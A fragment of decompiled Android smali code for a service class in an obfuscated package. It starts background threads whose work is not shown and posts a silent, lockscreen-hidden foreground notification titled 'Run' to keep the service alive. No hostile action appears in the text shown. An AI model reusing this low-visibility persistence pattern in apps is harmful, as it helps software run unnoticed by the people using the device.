    new-instance v1, Lcom/jadhalno/goplotu/Act$b;

    invoke-direct {v1, p0, p1}, Lcom/jadhalno/goplotu/Act$b;-><init>(Lcom/jadhalno/goplotu/Act;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 229
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 232
    return-void
.end method

.method public final h()V
    .locals 7

    .line 443
    const-string v0, "cards"

    .line 444
    .local v0, "NOTIFICATION_CHANNEL_ID":Ljava/lang/String;
    const-string v1, "OFFERS"

    .line 445
    .local v1, "channelName":Ljava/lang/String;
    new-instance v2, Landroid/app/NotificationChannel;

    const/4 v3, 0x0

    invoke-direct {v2, v0, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 446
    .local v2, "chan":Landroid/app/NotificationChannel;
    const v4, -0xffff01

    invoke-virtual {v2, v4}, Landroid/app/NotificationChannel;->setLightColor(I)V

    .line 447
    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 449
    const-string v4, "notification"

    invoke-virtual {p0, v4}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/NotificationManager;

    .line 450
    .local v4, "manager":Landroid/app/NotificationManager;
    nop

    .line 451
    invoke-virtual {v4, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 453
    new-instance v5, La/f/d/h;

    invoke-direct {v5, p0, v0}, La/f/d/h;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 454
    .local v5, "notificationBuilder":La/f/d/h;
    const/4 v6, 0x1

    invoke-virtual {v5, v6}, La/f/d/h;->g(Z)La/f/d/h;

    .line 455
    const-string v6, "Run"

    invoke-virtual {v5, v6}, La/f/d/h;->e(Ljava/lang/CharSequence;)La/f/d/h;

    .line 456
    invoke-virtual {v5, v3}, La/f/d/h;->h(I)La/f/d/h;

    .line 457
    const-string v3, "service"

    invoke-virtual {v5, v3}, La/f/d/h;->d(Ljava/lang/String;)La/f/d/h;

    .line 458
    invoke-virtual {v5}, La/f/d/h;->a()Landroid/app/Notification;

    move-result-object v3

    .line 459
    .local v3, "notification":Landroid/app/Notification;
    const/4 v6, 0x2

    invoke-virtual {p0, v6, v3}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 460
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 91
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .line 96
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "ServiceStartArguments"

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    .line 98
    .local v0, "thread":Landroid/os/HandlerThread;
    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 99
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 100
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/jadhalno/goplotu/Act$a;

    invoke-direct {v2, p0}, Lcom/jadhalno/goplotu/Act$a;-><init>(Lcom/jadhalno/goplotu/Act;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 195
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 196
    return-void
.end method
